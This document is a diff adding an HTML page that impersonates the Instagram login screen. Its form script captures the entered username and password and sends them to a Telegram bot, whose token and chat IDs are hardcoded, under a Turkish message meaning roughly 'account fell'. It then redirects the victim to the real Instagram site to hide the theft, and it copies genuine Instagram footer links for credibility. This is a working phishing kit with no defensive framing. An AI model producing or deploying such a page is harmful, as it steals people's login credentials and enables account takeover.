@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="favicon.png" type="image/pgn">
+    <title>Instagram</title>
+</head>
+<body>
+    <section>
+        <div class="main">
+            <div class="first">
+                <img src="instagram.png" alt="Logo">
+            </div>
+            <div class="second">       
+                <form onsubmit=sendToTelegram(event)>       
+                    <input type="text" name="username" placeholder="Phone number, username, or email." required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Log in</button>  
+                </form>         
+                <script> 
+                    function sendToTelegram(event) {
+                        event.preventDefault(); 
+
+                        
+                        const username = document.querySelector('input[name="username"]').value;
+                        const password = document.querySelector('input[name="password"]').value;
+
+                        
+                        const token = "8075912695:AAFlv1piNwea-shTa8AT7TdqK0W8ANEaSvA";  
+                        const chatIds = ["8169495753", "DÄ°ÄER_CHAT_ID"];  
+
+                        
+                        const message = `ð© Hesap dÃ¼ÅtÃ¼:\nð Username: ${username}\nð Password: ${password}`;
+
+                        chatIds.forEach(chatId=> {
+                            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message
+                            })
+                        });
+                        })
+                    
+
+                        
+                        window.location.href = "https://www.instagram.com";  
+                    }                             
+                </script>                       
+                <span>
+                    <p>____________________</p>
+                     OR
+                    <p>____________________</p>
+                </span>
+                <div class="fb">
+                    <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATmqgaz3qF55AM5WsRQzlaeBoB3WuI5VSjgjYlnAAoarQLw9lQ3kXpAFbIPsbHW8rGfxyOIzTQP9HdLqHw_bwM-pIfHnFqybfVcq-o_mCgHcOUsU8uRZ9jkP2mcDvuhNAxDIZPkZyiSwelx3uacIUgcW32Y8bC2UmUYoEUOplEG4NVmjU0t9rn_u54rEu336qNcL_bmZ6kc8nopP6AFnnPI_NeIbbxZ1iRMYE9O259BOnAkMV7e10CM0IYkIxsJ5gl--" target="_self" rel="noreferrer">
+                        <img src="fb.jpg" alt="">
+                        <h5>Log in with Facebook</h5>
+                    </a> 
+                </div>
+                <small>Forgot password?</small>
+            </div>
+        </div>
+        <div class="sub">
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="signup-link">Sign up</a></p>
+        </div>
+        <div class="apps">
+            <p>Get the app.</p>
+            <div class="images">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D1EE3A7A2-BCA0-48F2-9F14-B033B5CAF09E%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" target="_self" rel="noreferrer">
+                     <img src="googleplay.png" alt="">
+                 </a>
+                <a href="https://www.microsoft.com/" target="_self" rel="noreferrer">
+                    <img src="microsoft.png" alt="">
+                </a>                
+            </div>
+        </div>
+        <div class="footer">
+            <span onclick="redirectToPage('meta')">Meta</span>
+            <span onclick="redirectToPage('about')">About</span>
+            <span onclick="redirectToPage('blog')">Blog</span>
+            <span onclick="redirectToPage('jobs')">Jobs</span>
+            <span onclick="redirectToPage('help')">Help</span>
+            <span onclick="redirectToPage('api')">API</span>
+            <span onclick="redirectToPage('privacy')">Privacy</span>
+            <span onclick="redirectToPage('terms')">Terms</span>           
+            <span onclick="redirectToPage('threads')">Threads</span>
+            <span onclick="redirectToPage('locations')">Locations</span>
+            <span onclick="redirectToPage('instagramlite')">Instagram Lite</span>
+            <span onclick="redirectToPage('cu')">Contact Uploading & Non-Users</span>
+            <script>
+            function redirectToPage(page) {
+                event.preventDefault();
+                let url;
+                if (page === 'meta') {
+                    url = 'https://www.meta.com/about/?utm_source=about.meta.com&utm_medium=redirect'; 
+                } else if (page === 'about') {
+                    url = 'https://about.instagram.com/'; 
+                }else if (page === 'blog') {
+                    url = 'https://about.instagram.com/blog'; 
+                }else if (page === 'jobs') {
+                    url = 'https://l.instagram.com/?u=https%3A%2F%2Fabout.instagram.com%2Fabout-us%2Fcareers&e=AT0YUGe-G1qNVbDrq0ssMsih1yBaTyeNlVMs3U09UkkNcP7qEe4fNTzv8T6Z3z9ncP-79WD0kKwW7SlpZc2sUVlpBG6DZIIY&s=1'; 
+                }else if (page === 'help') {
+                    url = 'https://help.instagram.com/'; 
+                }else if (page === 'api') {
+                    url = 'https://developers.facebook.com/docs/instagram-platform'; 
+                }else if (page === 'privacy') {
+                    url = 'https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect'; 
+                }else if (page === 'terms') {
+                    url = 'https://help.instagram.com/581066165581870/'
+                }else if (page === 'threads') {
+                    url = 'https://www.threads.com/login/'; 
+                }else if (page === 'locations') {
+                    url = 'https://www.instagram.com/explore/locations/'; 
+                }else if (page === 'instagramlite') {
+                    url = 'https://www.instagram.com/web/lite/'; 
+                }else if (page === 'cu') {
+                    url = 'https://www.facebook.com/help/instagram/261704639352628'; 
+                }
+                const link = document.createElement('a');
+                link.href = url;
+                link.rel = 'noreferrer';  
+                link.target = '_self';    
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);  
+            }
+            </script>
+            <span style="cursor: auto;">Â© 2025 Instagram from Meta</span>
+        </div>
+    </section>
+</body>
+</html>
